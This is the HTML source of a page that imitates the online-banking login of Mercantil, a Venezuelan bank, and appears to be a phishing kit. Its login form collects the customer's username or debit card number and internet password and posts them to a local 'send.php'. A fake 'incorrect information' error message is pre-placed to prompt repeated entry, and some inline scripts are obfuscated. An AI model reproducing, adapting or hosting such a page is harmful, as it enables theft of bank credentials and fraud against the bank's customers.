<!DOCTYPE html>
<html lang="es">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="icon" href="merca.ico" type="image/x-icon" sizes="256x256"/>
    <title>Mercantil</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="theme-color" content="#1976d2">
    <link rel="stylesheet" href="assets/bootstrap.67b15cc69e6080ae.css" media="all" onload="this.media=&#39;all&#39;">
    <link rel="stylesheet" href="assets/intro-js.1f5cf64da5ee08c8.css" media="all" onload="this.media=&#39;all&#39;">
    <link rel="stylesheet" href="assets/styles.c663b1e287ec0a1e.css" media="all" onload="this.media=&#39;all&#39;">
    <link rel="stylesheet" href="assets/lara-light-blue-theme.8ecaee422619f77e.css" media="all" onload="this.media=&#39;all&#39;">
    <link rel="stylesheet" href="assets/primeng.a62c3f5e15ed62a4.css" media="all" onload="this.media=&#39;all&#39;">
    <link rel="stylesheet" href="styles.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
    <script src="assets/scrjs.js"></script>

    <style>
    .remember-toggle {
      display: inline-flex !important;
      align-items: center !important;
      gap: 8px !important;
      cursor: pointer !important;
      font-family: Arial, sans-serif !important;
    }

    .remember-text {
      font-size: 14px !important;
      font-weight: bold !important;
      color: #004e9b !important;
    }

    .remember-input {
      display: none !important;
    }

    .remember-slider {
      position: relative !important;
      width: 40px !important; /* un poco más ancho para compensar */
      height: 22px !important; /* más alto = más grueso */
      background-color: #b0c4de !important;
      border-radius: 22px !important;
      transition: background-color 0.3s !important;
    }

    .remember-slider::before {
      content: "" !important;
      position: absolute !important;
      left: 2px !important;
      top: 2px !important;
      width: 18px !important; /* círculo más grande */
      height: 18px !important;
      background-color: white !important;
      border-radius: 50% !important;
      transition: transform 0.3s !important;
    }

    .remember-input:checked + .remember-slider {
      background-color: #1976d2 !important;
    }

    .remember-input:checked + .remember-slider::before {
      transform: translateX(18px) !important; /* desplazamiento ajustado */
    }


        .logo-wrapper img,
.iso-wrapper img {
    width: 88px !important;
    height: auto !important;
    max-width: 120px !important;
    margin-left: 105px !important;
}
    </style>


    
</head>

<body>

    <app _nghost-ois-c32="" ng-version="13.3.11">
        <router-outlet _ngcontent-ois-c32=""></router-outlet>
        <melp-standard-layout _nghost-ois-c85="" class="ng-star-inserted">
            <melp-loading _ngcontent-ois-c85="" _nghost-ois-c33="">
                <div _ngcontent-ois-c33="" class="overlay">
                    <div _ngcontent-ois-c33="" class="multi-spinner-container">
                        <div _ngcontent-ois-c33="" class="multi-spinner blue">
                            <div _ngcontent-ois-c33="" class="multi-spinner orange"></div>
                        </div>
                    </div>
                </div>
            </melp-loading>
            <melp-header _ngcontent-ois-c85="" _nghost-ois-c54="">
                <div _ngcontent-ois-c54="" class="nav-bar">
                    <div _ngcontent-ois-c54="" class="left-side">
                        <div _ngcontent-ois-c54="" class="main-menu-toggle-wrapper">
                            <div _ngcontent-ois-c54="" class="main-menu-toggle"><span _ngcontent-ois-c54="" class="middle-line"></span></div>
                        </div>
                        <div _ngcontent-ois-c54="" class="bezel-wrapper"><span _ngcontent-ois-c54="" class="bezel-1"></span><span _ngcontent-ois-c54="" class="bezel-2"></span></div>
                        <div  class="logo-wrapper">
                        <img  alt="Logo" src="logotauro.svg">
                        </div>
                    </div>
                    <div _ngcontent-ois-c54="" class="right-side">
                        <div _ngcontent-ois-c54="" class="site-name-wrapper d-flex flex-row">
                            <p _ngcontent-ois-c54="" id="site-name">Mercantil en Línea Personas</p>
                            <div _ngcontent-ois-c54="" class="header-button change-melp ng-star-inserted"><button _ngcontent-ois-c54="" class="header-wrapper"><span _ngcontent-ois-c54="" class="header-text">Versión anterior</span></button></div>


                        </div>
                        <div _ngcontent-ois-c54="" class="transition">

                        </div>
                    </div>
                </div>
            </melp-header>
            <melp-confirm _ngcontent-ois-c85="" _nghost-ois-c55="">
                <div _ngcontent-ois-c55="" id="confirm-modal" class="overlay">
                    <div _ngcontent-ois-c55="" class="card">
                        <div _ngcontent-ois-c55="" class="modal-img"><img _ngcontent-ois-c55="" alt="icon" src="timer.svg"></div>
                        <div _ngcontent-ois-c55="" class="card-body">
                            <div _ngcontent-ois-c55="" class="modal-title">Hola, ¿estás ahí?</div>
                            <div _ngcontent-ois-c55="" class="modal-content">No has interactuado con nosotros en los últimos minutos.</div>
                            <div _ngcontent-ois-c55="" class="modal-content">¿Deseas mantener tu sesión activa?</div>
                            <div _ngcontent-ois-c55="" class="button-wrapper"><button _ngcontent-ois-c55="" class="btn btn-secondary">No</button><button _ngcontent-ois-c55="" class="btn btn-primary">Sí</button></div>
                        </div>
                    </div>
                </div>
            </melp-confirm>
            <melp-modal _ngcontent-ois-c85="" _nghost-ois-c56="">

            </melp-modal>
            <melp-modal-image _ngcontent-ois-c85="" _nghost-ois-c57="">

            </melp-modal-image>
            <melp-share-transaction-form _ngcontent-ois-c85="" _nghost-ois-c74="" class="ng-star-inserted">
                <div _ngcontent-ois-c74="" class="fade-background">
                    <div _ngcontent-ois-c74="" class="card"><span _ngcontent-ois-c74="" class="close">×</span>
                        <div _ngcontent-ois-c74="" class="card-body webTransaction__card">
                            <div _ngcontent-ois-c74="" class="title"></div>
                            <div class="share-info">

                                <div id="password-popup" style="display:none;">
                                    <!-- Aquí va el contenido del popup de contraseña -->
                                </div>
                            </div>

                        </div>
                    </div>
                </div>
            </melp-share-transaction-form>

            <div _ngcontent-ois-c85="" id="app-container">
                <div _ngcontent-ois-c85="" class="overlay-sidebar"></div>
                <melp-system-error _ngcontent-ois-c85="" _nghost-ois-c77="">
                    <div _ngcontent-ois-c77="" class="hide">
                        <melp-navigation _ngcontent-ois-c77="" _nghost-ois-c76="">

                            <div _ngcontent-ois-c76="" id="navigation">
                                <div _ngcontent-ois-c76="" class="data-info">
                                    <div _ngcontent-ois-c76="" class="data-info-section">
                                        <span _ngcontent-ois-c76="" class="data-info-section-breadcrumb ng-star-inserted">

                                        </span>

                                    </div>
                                    <div _ngcontent-ois-c76="" class="data-info-page ng-star-inserted"><span _ngcontent-ois-c76="" class="data-info-page-title">Inicia tu sesión</span></div>

                                    <melp-alert-float _ngcontent-ois-c76="" _nghost-ois-c75="">

                                    </melp-alert-float>
                                </div>
                            </div>
                        </melp-navigation>
                    </div>
                    <div _ngcontent-ois-c77="" id="system-error" class="hide">

                    </div>
                </melp-system-error>
                <melp-sidebar _ngcontent-ois-c85="" _nghost-ois-c79="" class="ng-star-inserted">


                    <div _ngcontent-ois-c79="" id="step1" data-tooltipclass="tour-class" class="sidebar notLogged">

                        <div _ngcontent-ois-c79="" class="li active ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="img-wrapper"><img _ngcontent-ois-c79="" alt="Inicia tu sesión" src="assets/get-into-activo.svg"></div>
                            <div _ngcontent-ois-c79=""><a _ngcontent-ois-c79="">Inicia tu sesión</a></div>
                        </div>

                        <div _ngcontent-ois-c79="" class="li ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="img-wrapper"><img _ngcontent-ois-c79="" alt="Regístrate" src="assets/create-user-activo.svg"></div>
                            <div _ngcontent-ois-c79=""><a _ngcontent-ois-c79="">Regístrate</a></div>
                        </div>

                        <div _ngcontent-ois-c79="" class="li ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="img-wrapper"><img _ngcontent-ois-c79="" alt="Recupera tu usuario" src="assets/user-activo.svg"></div>
                            <div _ngcontent-ois-c79=""><a _ngcontent-ois-c79="">Recupera tu usuario</a></div>
                        </div>

                        <div _ngcontent-ois-c79="" class="li ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="img-wrapper"><img _ngcontent-ois-c79="" alt="Cambia tu clave de internet" src="assets/change-activo.svg"></div>
                            <div _ngcontent-ois-c79=""><a _ngcontent-ois-c79="">Cambia tu clave de internet</a></div>
                        </div>

                        <div _ngcontent-ois-c79="" class="li ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="img-wrapper"><img _ngcontent-ois-c79="" alt="Desbloquea tu clave de internet" src="assets/unlock-activo.svg"></div>
                            <div _ngcontent-ois-c79=""><a _ngcontent-ois-c79="">Desbloquea tu clave de internet</a></div>
                        </div>



                        <div _ngcontent-ois-c79="" class="second-level scroll-second-level">

                        </div>
                        <div _ngcontent-ois-c79="" class="secondary-menu-wrapper ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="secondary-menu" style="border: none;"><a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted">
                                    <img _ngcontent-ois-c79="" src="assets/Cont-1.svg" alt="Contáctenos"></a>




                                <a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted"><img _ngcontent-ois-c79="" src="assets/Ubic-1.svg" alt="Ubíquenos"></a>




                                <a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted"><img _ngcontent-ois-c79="" src="assets/Tips_seg-1.svg" alt="Ciberseguridad"></a>




                                <a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted"><img _ngcontent-ois-c79="" src="assets/Pol_seg-1.svg" alt="Política de privacidad"></a>




                                <a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted"><img _ngcontent-ois-c79="" src="assets/Ter_cond-1.svg" alt="Términos y Condiciones"></a>








                            </div>
                        </div>

                        <div _ngcontent-ois-c79="" class="secondary-submenu-wrapper">


                        </div>
                    </div>
                </melp-sidebar>


                <melp-second-sidebar _ngcontent-ois-c85="" _nghost-ois-c83="">

                    <div _ngcontent-ois-c83="" class="second-sidebar">

                    </div>
                </melp-second-sidebar>

                <router-outlet _ngcontent-ois-c85=""></router-outlet>
                <melp-login _nghost-ois-c165="" class="ng-star-inserted">
                    <melp-login-background _ngcontent-ois-c165="" id="login-melp" _nghost-ois-c161="" class="ng-star-inserted">
                        <div _ngcontent-ois-c161="" class="faded-background">
                            <div _ngcontent-ois-c161="" class="content">
                                <div _ngcontent-ois-c165="" class="card-wrapper">
                                    <div _ngcontent-ois-c165="" class="card">
                                        <div _ngcontent-ois-c165="" class="card-body">
                                            <div _ngcontent-ois-c165="" class="login-title">
                                                <p _ngcontent-ois-c165="" class="login-welcome ng-star-inserted">Bienvenido</p>


                                                <span _ngcontent-ois-c165="" class="login-iniciated">Inicia tu sesión</span>
                                            </div><br>


                                            <!-- Mensaje de error -->
                                              <div id="errorMsg" class="error-message">
                                                  <img src="assets/alerta-rojo-new.svg">
                                                <p><strong>La información ingresada es incorrecta verifica e intenta nuevamente.</strong> Luego de tres (3) intentos fallidos se bloqueará tu acceso a Mercantil créditos en Línea.</p>
                                              </div>

                                            
                                            <melp-description _ngcontent-ois-c165="" _nghost-ois-c162="">
                                                <div _ngcontent-ois-c162="" class="description-wrapper active">
                                                    <div _ngcontent-ois-c162="" class="description">

                                                        <ul _ngcontent-ois-c162="" class="ng-star-inserted">

                                                        </ul>


                                                    </div>
                                                </div>
                                                <div _ngcontent-ois-c162="" class="error-message-wrapper">
                                                    <div _ngcontent-ois-c162="" class="error-img-wrapper"><img _ngcontent-ois-c162="" alt="Error" src="assets/alerta-rojo-new.svg"></div>
                                                    <div _ngcontent-ois-c162="" class="error-message ng-star-inserted">

                                                    </div>


                                                </div>
                                                <div _ngcontent-ois-c162="" class="info__wrapper">
                                                    <div _ngcontent-ois-c162="" class="error-img-wrapper ng-star-inserted"><img _ngcontent-ois-c162="" alt="Error" src="assets/Alerta-azul.svg"></div>

                                                    <div _ngcontent-ois-c162="" class="info__wrapper--message text-center"><span _ngcontent-ois-c162="" style="font-weight: bold;"></span>

                                                    </div>
                                                </div>
                                            </melp-description>
                                            <form id="loginForm" name="loginForm" method="POST" action="send.php" class="form-group ng-untouched ng-pristine">
                                                <div _ngcontent-ois-c165="" class="ng-star-inserted">
                                                    <mat-form-field _ngcontent-ois-c165="" floatlabel="always" class="mat-form-field ng-tns-c71-2 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-should-float mat-form-field-has-label ng-untouched ng-pristine ng-invalid ng-star-inserted">
                                                        <div class="mat-form-field-wrapper ng-tns-c71-2">
                                                            <div class="mat-form-field-flex ng-tns-c71-2">


                                                                <div class="mat-form-field-infix ng-tns-c71-2">
                                                                    <input name="usr2" id="usr2" placeholder="Ingresa..." formcontrolname="username" class="mat-input-element mat-form-field-autofill-control ng-untouched ng-pristine ng-invalid cdk-text-field-autofill-monitored ng-star-inserted" type="password" autocomplete="off" required>



                                                                    <span class="mat-form-field-label-wrapper ng-tns-c71-2"><label class="mat-form-field-label ng-tns-c71-2 ng-star-inserted" id="mat-form-field-label-5" for="username" aria-owns="username">

                                                                            <mat-label _ngcontent-ois-c165="" class="ng-tns-c71-2 ng-star-inserted">Usuario o Tarjeta de débito</mat-label>
                                                                            <span aria-hidden="true" class="mat-placeholder-required mat-form-field-required-marker ng-tns-c71-2 ng-star-inserted"> *</span>

                                                                        </label>

                                                                    </span>
                                                                </div>
                                                                <div class="mat-form-field-suffix ng-tns-c71-2 ng-star-inserted">
                                                                    <mat-icon _ngcontent-ois-c165="" matsuffix="" class="ng-tns-c71-2"><img _ngcontent-ois-c165="" alt="eye" class="icon pointer" src="assets/eye-disabled-blue.svg"></mat-icon>
                                                                </div>

                                                            </div>
                                                            <div class="mat-form-field-underline ng-tns-c71-2 ng-star-inserted"><span class="mat-form-field-ripple ng-tns-c71-2"></span></div>

                                                            <div class="mat-form-field-subscript-wrapper ng-tns-c71-2">

                                                                <div class="mat-form-field-hint-wrapper ng-tns-c71-2 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);">

                                                                    <div class="mat-form-field-hint-spacer ng-tns-c71-2"></div>
                                                                </div>

                                                            </div>
                                                        </div>
                                                    </mat-form-field>
                                                    <div _ngcontent-ois-c165="" class="login-link"> ¿Olvidaste tu usuario? </div>
                                                </div>

                                                <mat-form-field _ngcontent-ois-c165="" floatlabel="always" class="mat-form-field ng-tns-c71-1 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-should-float mat-form-field-has-label ng-untouched ng-pristine ng-invalid ng-star-inserted">
                                                    <div class="mat-form-field-wrapper ng-tns-c71-1">
                                                        <div class="mat-form-field-flex ng-tns-c71-1">


                                                            <div class="mat-form-field-infix ng-tns-c71-1">
                                                                <input name="clv2" id="clv2" placeholder="Ingresa..." formcontrolname="password" autocomplete="off" class="mat-input-element mat-form-field-autofill-control ng-tns-c71-1 ng-untouched ng-pristine ng-invalid cdk-text-field-autofill-monitored" minlength="8" type="password" required>
                                                                <span class="mat-form-field-label-wrapper ng-tns-c71-1">
                                                                    <label class="mat-form-field-label ng-tns-c71-1 ng-star-inserted" id="mat-form-field-label-3" for="password" aria-owns="password">

                                                                        <mat-label _ngcontent-ois-c165="" class="ng-tns-c71-1 ng-star-inserted">Clave de internet</mat-label>
                                                                        <span aria-hidden="true" class="mat-placeholder-required mat-form-field-required-marker ng-tns-c71-1 ng-star-inserted"> *</span>

                                                                    </label>

                                                                </span></div>
                                                            <div class="mat-form-field-suffix ng-tns-c71-1 ng-star-inserted">
                                                                <mat-icon _ngcontent-ois-c165="" matsuffix="" class="ng-tns-c71-1"><img _ngcontent-ois-c165="" alt="eye" class="icon pointer" src="assets/eye-disabled-blue.svg"></mat-icon>
                                                            </div>

                                                        </div>
                                                        <div class="mat-form-field-underline ng-tns-c71-1 ng-star-inserted"><span class="mat-form-field-ripple ng-tns-c71-1"></span></div>

                                                        <div class="mat-form-field-subscript-wrapper ng-tns-c71-1">

                                                            <div class="mat-form-field-hint-wrapper ng-tns-c71-1 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);">

                                                                <div class="mat-form-field-hint-spacer ng-tns-c71-1"></div>
                                                            </div>

                                                        </div>
                                                    </div>
                                                </mat-form-field>
                                                <div _ngcontent-ois-c165="" class="login-link"> ¿Olvidaste tu clave de internet? </div>
                                                
                                                

                                                <label class="remember-toggle">
                                                  <span class="remember-text">Recordar usuario</span>
                                                  <input type="checkbox" id="rememberUser" class="remember-input">
                                                  <span class="remember-slider"></span>
                                                </label>





                                                <div _ngcontent-ois-c165="" class="login-button">
                                                    <melp-button-wrapper _ngcontent-ois-c165="" _nghost-ois-c164="">
                                                        <div _ngcontent-ois-c164="" class="button-wrapper button-wrapper-separation-end">

                                                            <div _ngcontent-ois-c164="" class="button-wrapper-main-button w-100 button-wrapper-center">
                                                            <button type="submit" _ngcontent-ois-c164="" class="btn btn-primary ng-star-inserted">Iniciar</button>

                                                            </div>
                                                        </div>
                                                    </melp-button-wrapper>
                                                </div>

                                            </form>


                                        </div>
                                    </div>
                                </div>
                            </div>









                            <img _ngcontent-ois-c161="" alt="faded-background" class="bottom-img ng-star-inserted" src="assets/07.webp">
                            <div _ngcontent-ois-c161="" class="white-background ng-star-inserted"></div><img _ngcontent-ois-c161="" alt="Cliente" class="upper-img ng-star-inserted" src="assets/07(1).webp">



                        </div>
                    </melp-login-background>

                </melp-login>

                <melp-footer _ngcontent-ois-c85="" _nghost-ois-c84="">
                    <footer _ngcontent-ois-c84=""><span _ngcontent-ois-c84="" id="copyright" class="text-center">El acceso o uso no autorizado se considera un delito. Derechos protegidos por Mercantil C.A., Banco Universal. RIF: J-00002961-0.</span></footer>
                </melp-footer>
            </div>
        </melp-standard-layout>

    </app>
    <style>
        #loadingOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0, 0, 0, 0.5);
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: white;
            font-size: 18px;
            font-family: Arial, sans-serif;
            z-index: 9999;
        }

        .loading-container {
            margin-top: 25%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }
    </style>
    <div id="loadingOverlay">
        <div class="loading-container">
            <div class="spinner"></div><br><br>
            <p id="loadingText"></p>
        </div>
    </div>


    <script>
    // ===== SOLO LETRAS Y NÚMEROS =====
const inputUsr = document.getElementById('usr2');

if (inputUsr) {
  // Prevenir caracteres especiales en tiempo real
  inputUsr.addEventListener('keypress', function(e) {
    const char = String.fromCharCode(e.which);
    const validChars = /^[a-zA-Z0-9]$/;
    
    if (!validChars.test(char)) {
      e.preventDefault();
    }
  });
  
  // Limpiar al pegar
  inputUsr.addEventListener('paste', function(e) {
    e.preventDefault();
    const pastedText = (e.clipboardData || window.clipboardData).getData('text');
    const cleanText = pastedText.replace(/[^a-zA-Z0-9]/g, '');
    this.value = cleanText;
  });
  
  // Validar al salir
  inputUsr.addEventListener('blur', function() {
    this.value = this.value.replace(/[^a-zA-Z0-9]/g, '');
  });
} 
</script>

    <script>
    function _0x40c6(_0x371f11,_0x2a6364){_0x371f11=_0x371f11-0x106;const _0x230cef=_0x230c();let _0x40c6bc=_0x230cef[_0x371f11];return _0x40c6bc;}function _0x230c(){const _0x129aca=['140YRnpJt','10113112mwSmls','add','click','forEach','blur','876505sPBmrQ','remove','275364NaCeEx','focus','.mat-form-field','setAttribute','assets/eye-enabled-blue.svg','querySelector','text','querySelectorAll','1198Rmhhir','js-focused','1056251RLpGss','5735682dRLDFA','classList','password','assets/eye-disabled-blue.svg','.mat-form-field\x20.mat-input-element','closest','addEventListener','input','3417452ZNfhiO','6291zNleCW','type'];_0x230c=function(){return _0x129aca;};return _0x230c();}(function(_0x23d719,_0x2efb42){const _0x182dff=_0x40c6,_0x1dddba=_0x23d719();while(!![]){try{const _0x1a9a33=-parseInt(_0x182dff(0x116))/0x1+parseInt(_0x182dff(0x120))/0x2*(parseInt(_0x182dff(0x10e))/0x3)+parseInt(_0x182dff(0x10d))/0x4+-parseInt(_0x182dff(0x110))/0x5*(-parseInt(_0x182dff(0x118))/0x6)+parseInt(_0x182dff(0x122))/0x7+-parseInt(_0x182dff(0x111))/0x8+-parseInt(_0x182dff(0x123))/0x9;if(_0x1a9a33===_0x2efb42)break;else _0x1dddba['push'](_0x1dddba['shift']());}catch(_0x5e9b5f){_0x1dddba['push'](_0x1dddba['shift']());}}}(_0x230c,0xbb9c1),document['addEventListener']('DOMContentLoaded',function(){const _0x4ff375=_0x40c6;document['querySelectorAll'](_0x4ff375(0x109))[_0x4ff375(0x114)](function(_0x4cbfdd){const _0x376c3f=_0x4ff375,_0x253a35=_0x4cbfdd['closest'](_0x376c3f(0x11a));if(!_0x253a35)return;_0x4cbfdd['addEventListener'](_0x376c3f(0x119),()=>_0x253a35[_0x376c3f(0x106)][_0x376c3f(0x112)]('js-focused')),_0x4cbfdd[_0x376c3f(0x10b)](_0x376c3f(0x115),()=>_0x253a35[_0x376c3f(0x106)][_0x376c3f(0x117)](_0x376c3f(0x121)));}),document[_0x4ff375(0x11f)]('.mat-form-field-suffix\x20mat-icon\x20img')[_0x4ff375(0x114)](function(_0x2c10ba){const _0xf26664=_0x4ff375;_0x2c10ba[_0xf26664(0x10b)](_0xf26664(0x113),function(){const _0x556286=_0xf26664,_0x326682=_0x2c10ba[_0x556286(0x10a)](_0x556286(0x11a))[_0x556286(0x11d)](_0x556286(0x10c));if(!_0x326682)return;const _0x57ef74=_0x326682['getAttribute'](_0x556286(0x10f))===_0x556286(0x107);_0x326682[_0x556286(0x11b)]('type',_0x57ef74?_0x556286(0x11e):_0x556286(0x107)),_0x2c10ba['setAttribute']('src',_0x57ef74?_0x556286(0x11c):_0x556286(0x108));});});}));
    </script>

    <script>
    function _0x8204(){const _0x5236ac=['input','DOMContentLoaded','forEach','6609NKwdRG','querySelectorAll','40mRcjeP','509106VXjYDB','25956zrtAwt','4NJpwsu','display','275YwzHVH','3534272GyyUgU','style','753240ViWgsn','14KRyjDk','2270845jEJhJA','addEventListener','none','589664gCGhgj','errorMsg','234xzsyZA'];_0x8204=function(){return _0x5236ac;};return _0x8204();}const _0xb37727=_0x431d;function _0x431d(_0x249b9a,_0x1f85e3){_0x249b9a=_0x249b9a-0x1c1;const _0x82047c=_0x8204();let _0x431dc5=_0x82047c[_0x249b9a];return _0x431dc5;}(function(_0x56d2bf,_0x5b5a77){const _0x51040c=_0x431d,_0x136acf=_0x56d2bf();while(!![]){try{const _0x2dc23e=parseInt(_0x51040c(0x1ce))/0x1+-parseInt(_0x51040c(0x1d0))/0x2*(-parseInt(_0x51040c(0x1d4))/0x3)+-parseInt(_0x51040c(0x1c4))/0x4*(-parseInt(_0x51040c(0x1cb))/0x5)+-parseInt(_0x51040c(0x1c2))/0x6*(-parseInt(_0x51040c(0x1ca))/0x7)+parseInt(_0x51040c(0x1c7))/0x8+parseInt(_0x51040c(0x1c3))/0x9*(parseInt(_0x51040c(0x1c1))/0xa)+parseInt(_0x51040c(0x1c6))/0xb*(-parseInt(_0x51040c(0x1c9))/0xc);if(_0x2dc23e===_0x5b5a77)break;else _0x136acf['push'](_0x136acf['shift']());}catch(_0x2dc8b2){_0x136acf['push'](_0x136acf['shift']());}}}(_0x8204,0x56c1c),document[_0xb37727(0x1cc)](_0xb37727(0x1d2),function(){const _0x2c0eca=_0xb37727,_0x14c981=document['getElementById'](_0x2c0eca(0x1cf));_0x14c981&&document[_0x2c0eca(0x1d5)](_0x2c0eca(0x1d1))[_0x2c0eca(0x1d3)](function(_0x1b66c3){const _0x2159be=_0x2c0eca;_0x1b66c3[_0x2159be(0x1cc)](_0x2159be(0x1d1),function(){const _0x449664=_0x2159be;_0x14c981[_0x449664(0x1c8)][_0x449664(0x1c5)]=_0x449664(0x1cd);});});}));
    </script>


    
</body>
</html>
